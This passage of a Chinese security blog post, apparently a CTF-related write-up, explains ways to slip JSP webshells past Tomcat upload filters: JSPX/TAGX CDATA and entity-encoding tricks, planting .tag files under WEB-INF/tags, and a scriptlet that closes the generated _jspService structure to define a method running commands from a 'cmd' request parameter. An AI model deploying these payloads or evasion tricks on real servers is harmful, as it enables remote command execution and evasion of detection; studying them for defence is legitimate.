+<p>在 JSP 中，EL 表达式默认支持的是 <code>$&#123;&#125;</code> 语法，而 <code>#&#123;&#125;</code> 语法是用于 <strong>方法调用</strong> 的，通常出现在 <strong>JSF</strong>（JavaServer Faces）或某些特定框架（例如 Spring）中，而不是标准的 JSP EL 中。因此，默认情况下，JSP 中只支持 <code>$&#123;&#125;</code>，而 <code>#&#123;&#125;</code> 需要额外的配置。</p>
+</blockquote>
+<h3 id="trick4：-JSPX-x2F-TAGX-的-XML-Tricks"><a href="#trick4：-JSPX-x2F-TAGX-的-XML-Tricks" class="headerlink" title="trick4： JSPX &#x2F; TAGX 的 XML Tricks"></a>trick4： JSPX &#x2F; TAGX 的 XML Tricks</h3><p>在处理 JSPX（<code>.jspx</code>）和 TAGX（<code>.tagx</code>）文件时，Tomcat 会将这些文件视为 XML 格式进行解析。</p>
+<ul>
+<li><p><code>&lt;![CDATA[...]]&gt;</code> 绕过字符限制：CDATA（Character Data）区块允许在 XML 中包含不会被解析器处理的文本。通过将代码放入 CDATA 区块中，可以避免某些字符被解析器解释，从而绕过过滤</p>
+</li>
+<li><p>HTML 实体编码：在 XML 中，可以使用实体编码来表示特殊字符。例如，<code>\&amp;lt;</code> 表示 <code>&lt;</code>，<code>\&amp;gt;</code> 表示 <code>&gt;</code>，<code>\&amp;amp;</code> 表示 <code>&amp;</code></p>
+</li>
+<li><p>标签属性中注入 Payload</p>
+</li>
+</ul>
+<h3 id="trick5：tag绕过jsp内容检测"><a href="#trick5：tag绕过jsp内容检测" class="headerlink" title="trick5：tag绕过jsp内容检测"></a>trick5：tag绕过jsp内容检测</h3><p><code>.tag</code> 文件是 JSP 标签文件，被 JSP 引用时会执行。</p>
+<ul>
+<li>上传 <code>.tag</code> 文件到 <code>WEB-INF/tags</code></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件路径：/WEB-INF/tags/welcome.tag --&gt;</span><br><span class="line">Hello, $&#123;param.name&#125;!</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 <code>.jsp</code> 中这样引用：</li>
+</ul>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;my&quot;</span> tagdir=<span class="string">&quot;/WEB-INF/tags&quot;</span> %&gt;</span><br><span class="line">&lt;my:welcome /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果环境只对 <code>jsp</code> 后缀内容有严格限制，可以将 <code>.tag/.tagx</code> 文件落地在 <code>/WEB-INF/tags</code> 文件夹下，并在 jsp 中进行调用</p>
+<h3 id="trick6：-JSP-拼接闭合绕过"><a href="#trick6：-JSP-拼接闭合绕过" class="headerlink" title="trick6： JSP 拼接闭合绕过"></a>trick6： JSP 拼接闭合绕过</h3><p>JSP 文件在 Tomcat 中最终会被编译为 Java 类在 JSP 文件的处理中，Tomcat 处理 JSP 的方式是通过 <strong>字符串拼接</strong> 将 JSP 文件内容变成 Java 代码。用户编写的代码都会被放在 <code>_jspService</code> 方法中</p>
+<p>与其看生成代码，我们不如来看看case</p>
+<p>如下的jsp代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;JSP - Hello World&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;&lt;%= <span class="string">&quot;Hello World!&quot;</span> %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;hello-servlet&quot;</span>&gt;Hello Servlet&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>your_Tomcat_home\work\Catalina\localhost\ROOT\org\apache\jsp</code>下，能找到对应的java文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generated by the Jasper component of Apache Tomcat</span></span><br><span class="line"><span class="comment"> * Version: Apache Tomcat/8.5.56</span></span><br><span class="line"><span class="comment"> * Generated at: 2024-08-03 13:06:07 UTC</span></span><br><span class="line"><span class="comment"> * Note: The last modified time of this file was set to</span></span><br><span class="line"><span class="comment"> *       the last modified time of the source file after</span></span><br><span class="line"><span class="comment"> *       generation to assist with modification tracking.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> org.apache.jsp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">index_jsp</span> <span class="keyword">extends</span> <span class="title class_">org</span>.apache.jasper.runtime.HttpJspBase</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">org</span>.apache.jasper.runtime.JspSourceDependent,</span><br><span class="line">                 org.apache.jasper.runtime.JspSourceImports &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> javax.servlet.jsp.<span class="type">JspFactory</span> <span class="variable">_jspxFactory</span> <span class="operator">=</span></span><br><span class="line">          javax.servlet.jsp.JspFactory.getDefaultFactory();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    _jspx_imports_packages = <span class="keyword">new</span> <span class="title class_">java</span>.util.HashSet&lt;&gt;();</span><br><span class="line">    _jspx_imports_packages.add(<span class="string">&quot;javax.servlet&quot;</span>);</span><br><span class="line">    _jspx_imports_packages.add(<span class="string">&quot;javax.servlet.http&quot;</span>);</span><br><span class="line">    _jspx_imports_packages.add(<span class="string">&quot;javax.servlet.jsp&quot;</span>);</span><br><span class="line">    _jspx_imports_classes = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_dependants;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_imports_packages;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;</span><br><span class="line">    <span class="keyword">return</span> _jspx_imports_classes;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> javax.el.ExpressionFactory <span class="title function_">_jsp_getExpressionFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (_el_expressionfactory == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_el_expressionfactory == <span class="literal">null</span>) &#123;</span><br><span class="line">          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _el_expressionfactory;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> org.apache.tomcat.InstanceManager <span class="title function_">_jsp_getInstanceManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (_jsp_instancemanager == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_jsp_instancemanager == <span class="literal">null</span>) &#123;</span><br><span class="line">          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _jsp_instancemanager;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspService</span><span class="params">(<span class="keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="keyword">final</span> javax.servlet.http.HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> java.lang.<span class="type">String</span> <span class="variable">_jspx_method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;</span><br><span class="line">      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> javax.servlet.jsp.PageContext pageContext;</span><br><span class="line">    <span class="keyword">final</span> javax.servlet.ServletContext application;</span><br><span class="line">    <span class="keyword">final</span> javax.servlet.ServletConfig config;</span><br><span class="line">    javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> java.lang.<span class="type">Object</span> <span class="variable">page</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">    javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">_jspx_out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    javax.servlet.jsp.<span class="type">PageContext</span> <span class="variable">_jspx_page_context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">      pageContext = _jspxFactory.getPageContext(<span class="built_in">this</span>, request, response,</span><br><span class="line">      			<span class="literal">null</span>, <span class="literal">false</span>, <span class="number">8192</span>, <span class="literal">true</span>);</span><br><span class="line">      _jspx_page_context = pageContext;</span><br><span class="line">      application = pageContext.getServletContext();</span><br><span class="line">      config = pageContext.getServletConfig();</span><br><span class="line">      out = pageContext.getOut();</span><br><span class="line">      _jspx_out = out;</span><br><span class="line"></span><br><span class="line">      out.write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      out.write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">java.text.<span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.text.SimpleDateFormat(<span class="string">&quot;yyyy&quot;</span>);</span><br><span class="line">request.setAttribute(<span class="string">&quot;year&quot;</span>, sdf.format(<span class="keyword">new</span> <span class="title class_">java</span>.util.Date()));</span><br><span class="line">request.setAttribute(<span class="string">&quot;tomcatUrl&quot;</span>, <span class="string">&quot;https://tomcat.apache.org/&quot;</span>);</span><br><span class="line">request.setAttribute(<span class="string">&quot;tomcatDocUrl&quot;</span>, <span class="string">&quot;/docs/&quot;</span>);</span><br><span class="line">request.setAttribute(<span class="string">&quot;tomcatExamplesUrl&quot;</span>, <span class="string">&quot;/examples/&quot;</span>);</span><br><span class="line"></span><br><span class="line">      out.write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      out.write(<span class="string">&quot;&lt;!DOCTYPE html&gt;\r\n&quot;</span>);</span><br><span class="line">      out.write(<span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\r\n&quot;</span>);</span><br><span class="line">...write一大堆</span><br><span class="line">      out.write(<span class="string">&quot;&lt;/html&gt;\r\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.Throwable t) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(t <span class="keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;</span><br><span class="line">        out = _jspx_out;</span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span> &amp;&amp; out.getBufferSize() != <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (response.isCommitted()) &#123;</span><br><span class="line">              out.flush();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              out.clearBuffer();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (_jspx_page_context != <span class="literal">null</span>) _jspx_page_context.handlePageException(t);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      _jspxFactory.releasePageContext(_jspx_page_context);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;%%&gt;</code>块的内容被放到<code>_jspService</code>的try块中</p>
+<p>比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>大致生成的 Java 代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out.write(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因此，如果你能构造一段 JSP 片段，在拼接过程中<strong>闭合已有结构（如 try&#x2F;catch、if、方法体等）并注入新的代码块</strong>，就可以在不破坏原有结构的前提下，完成代码注入。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">hack(request.getParameter(<span class="string">&quot;cmd&quot;</span>));&#125;<span class="keyword">catch</span>(Throwable ignored)&#123;&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">      _jspxFactory.releasePageContext(_jspx_page_context);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hack</span><span class="params">(String cmd)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    java.lang.Runtime.getRuntime().exec(cmd);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里前面闭合掉 JSP 的包装结构，中间插入完整的 Java 方法，再由 JSP 引擎拼接生成 <code>.java</code> 时被原样拼进源码，从而执行。</p>
+<p>虽然适用面很窄，但是能利用这种姿势绕过对_jspService内敏感函数的检测。</p>
+<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>具体的代码分析：<a target="_blank" rel="noopener" href="https://su18.org/post/Desperate-Cat/">https://su18.org/post/Desperate-Cat/</a></p>
+<p>你可以永远相信su18大佬</p>
+<p>此处不再调试，看su18佬的文章，不能想着跟着去调，复调一遍没有任何意义，因为文章已经讲的非常细致。应该是总结，总结文章到底想介绍针对什么场景，又介绍了什么样的攻击手法</p>
+<p>我觉得安全学习就是这么矛盾，分析很详细的文章，就想着去总结，分析很简略的文章，就想着去细调。但正是这种矛盾，让我们找到自己的目标。</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/Tomcat/" class="">
+              Tomcat
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>GodownKai</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2025/04/21/2022rwctf-desperate-cat-xue-xi-zi-fu-chuan-xie-jar-wen-jian-he-zang-shu-ju-rao-guo/" target="_blank" title="Tomcat下SpEL的不出网利用">https://godownio.github.io/2025/04/21/2022rwctf-desperate-cat-xue-xi-zi-fu-chuan-xie-jar-wen-jian-he-zang-shu-ju-rao-guo/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2025/04/17/spel-de-bu-chu-wang-li-yong/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">Tomcat下SpEL的不出网利用</div>
+      </div>
+      <!-- <div class="content">
+        依旧来自p神的Springboot Code-Breaking 2025小挑战https://github.com/ph
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          慧眼识珠牢弟
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>Godown_blog</h2>
+        
+        
+          <p>something for nothing</p>
+
+        
+        
+          <p><span id="jinrishici-sentence">Godown_blog</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/yuang01/hexo-theme-bamboo"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1958304602"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
